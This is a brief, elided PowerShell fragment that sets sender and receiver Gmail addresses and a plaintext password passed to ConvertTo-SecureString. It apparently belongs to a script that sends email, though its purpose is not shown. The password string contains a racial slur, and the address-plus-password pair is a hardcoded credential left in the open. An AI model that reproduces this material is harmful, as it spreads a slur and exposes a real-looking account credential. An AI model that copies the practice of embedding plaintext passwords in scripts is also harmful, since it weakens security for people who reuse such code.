...
$From = "jerryspriner0@gmail.com" # Put the SENDER HERE
$To = "jim.may.094@gmail.com" # Put the RECEIVER HERE
...
$Password = "Niggers123." | ConvertTo-SecureString -AsPlainText -Force
